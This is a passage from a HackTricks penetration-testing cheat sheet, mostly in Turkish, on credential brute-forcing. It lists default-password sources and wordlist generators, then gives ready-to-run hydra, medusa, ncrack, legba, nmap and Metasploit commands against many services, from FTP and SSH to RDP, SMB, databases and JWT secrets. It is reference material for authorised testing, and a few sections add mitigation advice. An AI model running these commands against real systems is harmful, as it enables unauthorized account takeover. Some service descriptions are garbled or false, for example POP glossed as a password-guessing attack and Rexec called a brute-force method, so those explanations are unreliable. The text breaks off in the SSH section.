# Brute Force - Kopya Kağıdı

<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dünyanın en gelişmiş topluluk araçlarıyla desteklenen **otomatik iş akışları** oluşturun ve otomatikleştirin.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Sıfırdan kahramana kadar AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na(https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family)
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı göndererek HackTricks** ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks) github depolarına PR'lar gönderin.

</details>

## Varsayılan Kimlik Bilgileri

Kullanılan teknolojinin varsayılan kimlik bilgilerini aramak için google'da arama yapın veya **bu bağlantıları deneyin**:

* [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
* [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
* [**http://www.vulnerabilityassessment.co.uk/passwordsC.htm**](http://www.vulnerabilityassessment.co.uk/passwordsC.htm)
* [**https://192-168-1-1ip.mobi/default-router-passwords-list/**](https://192-168-1-1ip.mobi/default-router-passwords-list/)
* [**https://datarecovery.com/rd/default-passwords/**](https://datarecovery.com/rd/default-passwords/)
* [**https://bizuns.com/default-passwords-list**](https://bizuns.com/default-passwords-list)
* [**https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv**](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)
* [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com)
* [**https://many-passwords.github.io/**](https://many-passwords.github.io)
* [**https://theinfocentric.com/**](https://theinfocentric.com/)

## **Kendi Sözlüklerinizi Oluşturun**

Hedefle ilgili mümkün olduğunca fazla bilgi bulun ve özel bir sözlük oluşturun. Yardımcı olabilecek araçlar:

### Crunch
```bash
crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst)

@ Lower case alpha characters
, Upper case alpha characters
% Numeric characters
^ Special characters including spac
crunch 6 8 -t ,@@^^%%
```
### Cewl

Cewl, bir web sitesinden metin çıkarmak için kullanılan bir araçtır. Bu araç, web sitesindeki metinleri analiz eder ve belirli bir kelime uzunluğundan daha uzun olan kelimeleri çıkarır. Bu, hedef web sitesindeki metinleri incelemek ve potansiyel olarak kullanışlı parolalar veya anahtar kelimeler elde etmek için kullanışlı bir yöntem olabilir.
```bash
cewl example.com -m 5 -w words.txt
```
### [CUPP](https://github.com/Mebus/cupp)

Kurban hakkındaki bilgilerinize dayanarak şifreler oluşturun (isimler, tarihler...)
```
python3 cupp.py -h
```
### [Wister](https://github.com/cycurity/wister)

Belirli bir hedefle ilgili kullanmak için benzersiz ve ideal bir kelime listesi oluşturmanıza olanak tanıyan bir kelime listesi oluşturma aracıdır, size verilen kelimelerden çeşitli varyasyonlar oluşturmanıza olanak tanır.
```bash
python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst

__          _______  _____ _______ ______ _____
\ \        / /_   _|/ ____|__   __|  ____|  __ \
\ \  /\  / /  | | | (___    | |  | |__  | |__) |
\ \/  \/ /   | |  \___ \   | |  |  __| |  _  /
\  /\  /   _| |_ ____) |  | |  | |____| | \ \
\/  \/   |_____|_____/   |_|  |______|_|  \_\

Version 1.0.3                    Cycurity

Generating wordlist...
[########################################] 100%
Generated 67885 lines.

Finished in 0.920s.
```
### [pydictor](https://github.com/LandGrey/pydictor)

### Kelime Listeleri

* [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://github.com/kaonashi-passwords/Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi)
* [**https://github.com/google/fuzzing/tree/master/dictionaries**](https://github.com/google/fuzzing/tree/master/dictionaries)
* [**https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm**](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
* [**https://weakpass.com/wordlist/**](https://weakpass.com/wordlist/)
* [**https://wordlists.assetnote.io/**](https://wordlists.assetnote.io/)
* [**https://github.com/fssecur3/fuzzlists**](https://github.com/fssecur3/fuzzlists)
* [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
* [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)

<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) kullanarak dünyanın en gelişmiş topluluk araçlarıyla desteklenen **iş akışlarını kolayca oluşturun ve otomatikleştirin**.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Hizmetler

Hizmet adına göre alfabetik olarak sıralanmıştır.

### AFP
```bash
nmap -p 548 --script afp-brute <IP>
msf> use auxiliary/scanner/afp/afp_login
msf> set BLANK_PASSWORDS true
msf> set USER_AS_PASS true
msf> set PASS_FILE <PATH_PASSWDS>
msf> set USER_FILE <PATH_USERS>
msf> run
```
### AJP

AJP, or Apache JServ Protocol, is a binary protocol that allows a standalone web server to communicate with the Tomcat servlet container. It is similar to the HTTP protocol but more efficient for communicating with Tomcat. A common attack against AJP is credential brute-forcing, where an attacker tries to guess usernames and passwords to gain unauthorized access to the Tomcat server.
```bash
nmap --script ajp-brute -p 8009 <IP>
```
## AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM ve Solace)
```bash
legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]
```
### Cassandra

Cassandra, Apache Software Foundation tarafından geliştirilen ve yüksek ölçeklenebilir ve yüksek performanslı bir dağıtılmış veritabanı yönetim sistemidir. Brute force saldırıları genellikle zayıf parolaları kırma amacıyla kullanılır. Güvenlik açıklarını önlemek için güçlü ve karmaşık parolalar kullanılmalıdır.
```bash
nmap --script cassandra-brute -p 9160 <IP>
# legba ScyllaDB / Apache Casandra
legba scylla --username cassandra --password wordlists/passwords.txt --target localhost:9042
```
### CouchDB

Brute force is a common attack method used to gain unauthorized access to a system. In the case of CouchDB, attackers may use brute force to guess usernames and passwords in order to access the database. To prevent this type of attack, it is important to use strong and unique passwords, implement account lockout policies, and monitor for multiple failed login attempts.
```bash
msf> use auxiliary/scanner/couchdb/couchdb_login
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
```
### Docker Registry

### Docker Kayıt Defteri
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
```
### Elasticsearch

Elasticsearch, bir açık kaynaklı arama ve analiz motorudur. Elasticsearch, RESTful API'leri kullanarak JSON belgeleri üzerinde arama yapmak için kullanılır. Elasticsearch, büyük miktarda veriyi hızlı bir şekilde indeksleyebilir ve arayabilir. Ayrıca, Elasticsearch'in güçlü sorgu dilini kullanarak karmaşık sorgular oluşturabilirsiniz.
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
```
### FTP

FTP, dosya transfer protokolü anlamına gelir. Bir sunucuya dosya transfer etmek veya sunucudan dosya indirmek için kullanılır. FTP sunucularına erişmek için genellikle kullanıcı adı ve şifre gereklidir. FTP protokolü, dosya transferi için kullanılan standart bir protokoldür.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ftp
ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
legba ftp --username admin --password wordlists/passwords.txt --target localhost:21
```
### HTTP Genel Kaba Kuvvet

#### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)

### HTTP Temel Kimlik Doğrulama
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
# Use https-get mode for https
medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -T 10
legba http.basic --username admin --password wordlists/passwords.txt --target http://localhost:8888/
```
### HTTP - NTLM

Brute-force attacks against HTTP NTLM authentication can be performed using tools like `Hydra` or `Medusa`. These tools support NTLM authentication and can be used to crack passwords by trying different combinations. It is important to note that brute-forcing NTLM hashes can be time-consuming due to the nature of the NTLM protocol.
```bash
legba http.ntlm1 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
```
### HTTP - Post Form

#### Brute Force

Brute force is a common technique used to gain unauthorized access to a system by trying all possible combinations of usernames and passwords until the correct one is found. This method can be automated using tools like Hydra or Burp Suite Intruder. It is important to note that brute force attacks can be detected and prevented by implementing measures such as account lockouts after multiple failed login attempts, using strong and complex passwords, and implementing multi-factor authentication.
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
# Use https-post-form mode for https
```
### **HTTP - CMS --** (W)ordpress, (J)oomla veya (D)rupal veya (M)oodle için "http-post-form"dan "**https-post-form"**'a değiştirmeniz gerekmektedir.
```bash
cmsmap -f W/J/D/M -u a -p a https://wordpress.com
# Check also https://github.com/evilsocket/legba/wiki/HTTP
```
### IMAP

IMAP (Internet Message Access Protocol) is a standard email protocol that stores email messages on a mail server. IMAP allows an email client to access email on the server. It is commonly used for receiving emails.
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
nmap -sV --script imap-brute -p <PORT> <IP>
legba imap --username user --password data/passwords.txt --target localhost:993
```
### IRC

IRC, Internet Relay Chat, eski ama hala popüler bir iletişim protokolüdür. IRC sunucularına erişmek ve hedef sistemdeki kullanıcı adları ve kanallar hakkında bilgi edinmek için brute force saldırıları kullanılabilir. Bu saldırılar genellikle kullanıcı adı ve şifre kombinasyonlarını denemek için kullanılır.
```bash
nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
```
### ISCSI

### ISCSI
```bash
nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
```
### JWT

JWT, yani JSON Web Token, kimlik doğrulama ve bilgi paylaşımı için kullanılan bir standarttır. JWT'ler, üç bölümden oluşur: başlık, yük ve imza. Başlık, JWT'nin türünü ve kullanılan algoritmayı belirtir. Yük, JWT'nin içeriğini ve isteğe bağlı verileri içerir. İmza ise JWT'nin doğruluğunu sağlamak için kullanılır. JWT'ler genellikle kimlik doğrulama işlemlerinde kullanılır ve güvenli bir iletişim sağlamak için şifrelenir.
```bash
#hashcat
hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt

#https://github.com/Sjord/jwtcrack
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#John
john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256

#https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py -d wordlists.txt <JWT token>

#https://github.com/brendan-rius/c-jwt-cracker
./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8

#https://github.com/mazen160/jwt-pwn
python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt

#https://github.com/lmammino/jwt-cracker
jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
```
### LDAP

Lightweight Directory Access Protocol (Hafif Dizin Erişim Protokolü) olarak bilinen LDAP, genellikle kullanıcı kimlik doğrulama ve yetkilendirme için kullanılan bir protokoldür. LDAP sunucularına karşı brute force saldırıları, genellikle kullanıcı adı ve şifre kombinasyonlarını deneyerek gerçekleştirilir. Bu saldırılar, zayıf şifrelerin tespit edilmesine ve sistemlere yetkisiz erişime neden olabilir.
```bash
nmap --script ldap-brute -p 389 <IP>
legba ldap --target 127.0.0.1:389 --username admin --password @wordlists/passwords.txt --ldap-domain example.org --single-match
```
### MQTT

#### Brute Force

Brute force attacks against MQTT brokers involve attempting to guess valid credentials by systematically trying all possible combinations of usernames and passwords. This can be achieved using automated tools like Hydra or custom scripts.

#### Mitigation

To mitigate brute force attacks against MQTT brokers, consider implementing the following measures:

1. **Strong Credentials**: Enforce the use of strong, complex passwords to make it harder for attackers to guess.

2. **Account Lockout Policy**: Implement an account lockout policy that locks out users after a certain number of failed login attempts.

3. **Rate Limiting**: Implement rate limiting to restrict the number of login attempts from a single IP address within a specific time frame.

4. **Multi-Factor Authentication (MFA)**: Enable MFA to add an extra layer of security to the authentication process.

5. **Monitoring and Logging**: Monitor MQTT broker logs for any suspicious login activities and set up alerts for unusual login patterns.

By implementing these measures, you can enhance the security of your MQTT broker and protect it against brute force attacks.
```
ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
legba mqtt --target 127.0.0.1:1883 --username admin --password wordlists/passwords.txt
```
### Mongo

MongoDB, Brute Force Saldırılarına Karşı Güvenlik

MongoDB veritabanları, genellikle varsayılan yapılandırmaları nedeniyle brute force saldırılarına karşı savunmasız olabilir. Bu saldırılar, saldırganın oturum açma kimlik bilgilerini tahmin etmek için otomatik araçlar kullanarak sisteme erişmeye çalıştığı bir tür saldırıdır.

MongoDB veritabanınızı brute force saldırılarına karşı korumak için aşağıdaki adımları izleyebilirsiniz:

1. Güçlü Şifreler Kullanın: Karmaşık ve güçlü şifreler oluşturarak saldırganların şifreleri tahmin etmelerini zorlaştırın.
2. Oturum Açma Denemelerini Sınırlayın: MongoDB'nin oturum açma denemelerini sınırlayan yerleşik mekanizmalarını kullanarak saldırıları önleyin.
3. Güvenlik Duvarı Kurun: Veritabanınıza erişimi sınırlamak için güvenlik duvarı kurun ve yalnızca güvenilir IP adreslerinden erişime izin verin.
4. Güncelleyin: MongoDB'nin en son sürümünü kullanarak güvenlik açıklarını en aza indirin ve düzenli olarak güncellemeleri kontrol edin.

Bu adımları takip ederek MongoDB veritabanınızı brute force saldırılarına karşı daha güvenli hale getirebilirsiniz.
```bash
nmap -sV --script mongodb-brute -n -p 27017 <IP>
use auxiliary/scanner/mongodb/mongodb_login
legba mongodb --target localhost:27017 --username root --password data/passwords.txt
```
### MSSQL

#### Brute Force

Brute force is a common technique used to gain unauthorized access to an MSSQL server by trying all possible password combinations until the correct one is found. This method can be automated using tools like Hydra or Metasploit to speed up the process. It is important to note that brute force attacks can be detected and blocked by implementing strong password policies, account lockout mechanisms, and monitoring for multiple failed login attempts.
```bash
legba mssql --username SA --password wordlists/passwords.txt --target localhost:1433
```
### MySQL

MySQL, bir veritabanı yönetim sistemidir ve birçok web uygulamasında kullanılır. Brute force saldırıları genellikle MySQL veritabanlarına erişmek için kullanılır. Saldırganlar, genellikle kullanıcı adı ve şifre kombinasyonlarını deneyerek veritabanına erişmeye çalışırlar. Bu saldırı türüne karşı korunmak için güçlü ve karmaşık şifreler kullanılmalı ve erişim kontrolleri sıkı bir şekilde yapılandırılmalıdır.
```bash
# hydra
hydra -L usernames.txt -P pass.txt <IP> mysql

# msfconsole
msf> use auxiliary/scanner/mysql/mysql_login; set VERBOSE false

# medusa
medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on first success attempt> -t <threads> -M mysql

#Legba
legba mysql --username root --password wordlists/passwords.txt --target localhost:3306
```
### OracleSQL

#### Brute Force

Brute force is a common technique used to gain unauthorized access to OracleSQL databases. It involves trying all possible combinations of usernames and passwords until the correct one is found. This method can be time-consuming but is often successful if the credentials are weak. There are tools available that can automate the brute force process, such as Hydra and Metasploit. It is important to note that brute force attacks can be detected and prevented by implementing strong password policies, account lockout mechanisms, and monitoring for multiple failed login attempts.
```bash
patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017

./odat.py passwordguesser -s $SERVER -d $SID
./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt

#msf1
msf> use admin/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORT 1521
msf> set SID <SID>

#msf2, this option uses nmap and it fails sometimes for some reason
msf> use scanner/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORTS 1521
msf> set SID <SID>

#for some reason nmap fails sometimes when executing this script
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>

legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
```
**oracle_login**'ı **patator** ile kullanabilmek için **yükleme** yapmanız gerekmektedir:
```bash
pip3 install cx_Oracle --upgrade
```
[Çevrimdışı OracleSQL hash bruteforce](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**sürümler 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** ve **11.2.0.3**):
```bash
nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
```
### POP

POP, yani "Parola Kaba Kuvvet Saldırısı", bir saldırganın bir hedef sistemdeki hesaplara erişmek için otomatik olarak farklı parola kombinasyonlarını denemesidir. Bu saldırı genellikle zayıf veya yaygın kullanılan parolaları hedef alır. Saldırganlar genellikle bu yöntemi kullanarak sistemlere girmeye çalışırlar.
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V

# Insecure
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:110

# SSL
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:995 --pop3-ssl
```
### PostgreSQL

PostgreSQL, açık kaynaklı bir ilişkisel veritabanı yönetim sistemi (RDBMS) olup, genellikle web uygulamaları ve veri depolama alanlarında kullanılmaktadır. Brute force saldırıları, genellikle PostgreSQL veritabanlarına erişim elde etmek için kullanılan bir yöntemdir. Bu saldırılar, oturum açma ekranlarına veya yönetici panellerine erişmek için kullanıcı adı ve şifre kombinasyonlarını denemek suretiyle gerçekleştirilir. Güçlü ve karmaşık şifreler kullanarak PostgreSQL veritabanlarını brute force saldırılarına karşı korumak önemlidir.
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP>:5432
patator pgsql_login host=<IP> user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
use auxiliary/scanner/postgres/postgres_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
legba pgsql --username admin --password wordlists/passwords.txt --target localhost:5432
```
### PPTP

`.deb` paketini indirmek için [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/) adresine gidebilirsiniz.
```bash
sudo dpkg -i thc-pptp-bruter*.deb #Install the package
cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
```
### RDP

#### Brute Force

Brute force attacks against RDP servers involve attempting to log in by systematically trying all possible combinations of usernames and passwords until the correct one is found. This method is time-consuming but can be effective if weak credentials are used. It is important to use strong, complex passwords and implement account lockout policies to prevent successful brute force attacks.
```bash
ncrack -vv --user <User> -P pwds.txt rdp://<IP>
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
legba rdp --target localhost:3389 --username admin --password data/passwords.txt [--rdp-domain <RDP_DOMAIN>] [--rdp-ntlm] [--rdp-admin-mode] [--rdp-auto-logon]
```
### Redis

Redis, bir açık kaynaklı, in-memory veritabanı yönetim sistemidir. Redis sunucularına brute force saldırıları, genellikle zayıf veya sık kullanılan şifrelerin kullanılmasıyla gerçekleştirilir. Bu saldırılar, oturum açma sayfası, API veya yönetim arayüzü gibi Redis sunucusuna erişim sağlayan herhangi bir arayüz üzerinden gerçekleştirilebilir. Saldırganlar, oturum açma sayfasına veya API'ye doğrudan erişim sağlamak yerine, Redis sunucusuna erişim sağlamak için brute force saldırıları gerçekleştirebilirler. Bu tür saldırılar, güvenlik açıklarını tespit etmek ve kapatmak için önemli bir adımdır.
```bash
msf> use auxiliary/scanner/redis/redis_login
nmap --script redis-brute -p 6379 <IP>
hydra –P /path/pass.txt redis://<IP>:<PORT> # 6379 is the default
legba redis --target localhost:6379 --username admin --password data/passwords.txt [--redis-ssl]
```
### Rexec

Rexec, kaba kuvvet saldırıları için kullanılan bir yöntemdir. Bu yöntem, bir kullanıcı adı ve şifre kombinasyonunu doğrulamak için bir dizi olası değeri denemek için otomatik bir süreç kullanır. Bu saldırı türü, zayıf veya tahmin edilebilir şifrelerin tespit edilmesi için yaygın olarak kullanılır.
```bash
hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
```
### Rlogin

Rlogin, Remote Login, is a service that allows users to log in to a remote system over a network. It is a protocol that transmits login information in plain text, making it vulnerable to interception. Brute force attacks can be used to guess passwords and gain unauthorized access to remote systems.
```bash
hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
```
### Rsh

Rsh, Remote Shell, is a protocol that allows a user to execute commands on a remote system. It is often targeted during brute-force attacks to gain unauthorized access to a system.
```bash
hydra -L <Username_list> rsh://<Victim_IP> -v -V
```
[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)

### Rsync

Rsync, bir dosya senkronizasyon aracıdır. Dosyaları ve dizinleri yerel ve uzak sistemler arasında senkronize etmek için kullanılır.
```bash
nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
```
### RTSP

RTSP, Gerçek Zamanlı İletim Protokolü anlamına gelir. RTSP, video ve ses akışlarını kontrol etmek için kullanılan bir iletişim protokolüdür. Özellikle IP kameralar ve video sunucuları gibi cihazlar arasında medya akışlarını yönetmek için yaygın olarak kullanılır.
```bash
hydra -l root -P passwords.txt <IP> rtsp
```
### SFTP

---

Brute force attacks against SFTP servers involve attempting to log in to an SFTP server by systematically checking all possible passwords until the correct one is found. This is typically achieved using automated tools that can rapidly try different password combinations. 

Brute force attacks can be mitigated by implementing strong password policies, such as using complex and lengthy passwords, limiting login attempts, and enabling account lockouts after a certain number of failed attempts. Additionally, using multi-factor authentication can add an extra layer of security to prevent unauthorized access even if passwords are compromised.
```bash
legba sftp --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba sftp --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```
### SNMP

SNMP, yani Basit Ağ Yönetim Protokolü, ağ cihazlarını izlemek, yönetmek ve bilgi toplamak için kullanılan bir protokoldür. SNMP brute force saldırıları, genellikle varsayılan topluluk dizesi gibi zayıf kimlik doğrulama bilgilerini kullanarak SNMP hizmetlerine erişmeye çalışır. Bu saldırılar, ağ cihazlarının kontrolünü ele geçirmek veya hassas bilgilere erişmek için kullanılabilir.
```bash
msf> use auxiliary/scanner/snmp/snmp_login
nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <IP>
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
```
### SMB

### SMB

SMB, Windows'ta dosya ve yazıcı paylaşımı için kullanılan bir protokoldür. SMB brute force saldırıları, genellikle kullanıcı adı ve şifre kombinasyonlarını deneyerek bir sisteme erişmeye çalışır. Bu saldırılar genellikle oturum açma ekranlarına veya dosya paylaşımı erişimine yöneliktir. Saldırganlar, oturum açma ekranlarına erişmek veya hassas verilere erişmek için bu yöntemi kullanabilirler.
```bash
nmap --script smb-brute -p 445 <IP>
hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
legba smb --target share.company.com --username admin --password data/passwords.txt [--smb-workgroup <SMB_WORKGROUP>] [--smb-share <SMB_SHARE>]
```
### SMTP

Simple Mail Transfer Protocol (Basit Posta Aktarım Protokolü) olarak da bilinen SMTP, e-posta iletilerinin iletilmesi için kullanılan standart bir ileti aktarım protokolüdür.
```bash
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
legba smtp --username admin@example.com --password wordlists/passwords.txt --target localhost:25 [--smtp-mechanism <mech>]
```
### SOCKS

SOCKS stands for Socket Secure and is a protocol that routes network packets between a client and a server through a proxy server. It can be used in a brute force attack to hide the attacker's IP address and location.
```bash
nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt
# With alternative address
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt --socks5-address 'internal.company.com' --socks5-port 8080
```
### SQL Server

SQL Server, Microsoft'un ilişkisel veritabanı yönetim sistemidir. SQL Server veritabanlarına brute force saldırıları genellikle SQL Injection saldırılarıyla birlikte gerçekleştirilir. Brute force saldırıları, saldırganın SQL Server veritabanına erişmek için kullanıcı adı ve şifre kombinasyonlarını denemesini içerir. Bu saldırı türü, zayıf veya varsayılan şifrelerin kullanıldığı durumlarda etkili olabilir. Saldırgan, oturum açmak için doğru kullanıcı adı ve şifreyi bulana kadar sürekli denemeler yapar. Bu tür saldırılara karşı koymak için güçlü ve karmaşık şifreler kullanılmalı ve oturum açma denemelerini sınırlayan önlemler alınmalıdır.
```bash
#Use the NetBIOS name of the machine as domain
crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> mssql
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts <host> #Use domain if needed. Be careful with the number of passwords in the list, this could block accounts
msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
```
### SSH

SSH, Secure Shell'in kısaltmasıdır. SSH brute force saldırıları, genellikle şifre deneme saldırıları kullanılarak gerçekleştirilir. Saldırganlar, SSH sunucusuna erişmek için farklı şifre kombinasyonlarını deneyerek giriş yapmaya çalışırlar. Bu saldırı türü, güvenlik duvarı veya güvenlik önlemleri tarafından engellenmediği sürece etkili olabilir. Saldırganlar genellikle otomatik araçlar kullanarak büyük bir şifre listesini hızla deneyebilirler. Bu nedenle, güçlü ve benzersiz şifreler kullanmak önemlidir.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ssh
ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
